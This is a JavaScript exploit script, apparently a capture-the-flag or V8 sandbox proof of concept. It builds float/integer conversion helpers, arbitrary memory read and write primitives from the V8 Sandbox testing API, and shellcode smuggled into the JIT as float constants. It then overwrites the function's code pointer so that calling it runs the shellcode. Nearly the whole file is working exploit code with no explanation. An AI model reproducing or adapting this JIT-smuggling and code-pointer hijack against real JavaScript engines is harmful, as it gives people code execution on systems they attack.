var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}


// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}


var mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addressOf(obj){
    return Sandbox.getAddressOf(obj);
}

function AAR(addr){
    return mem.getUint32(addr, true);
}
function AAW(addr,val){
    mem.setUint32(addr, val, true);
}

const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 40000; i++){
    shellcode();
}

// p(shellcode);

var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0x18);
var ins_base = code_addr+0xb3-0x3f;
AAW(shellcode_addr+0x18,ins_base);

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);

// stop();
shellcode();

// spin();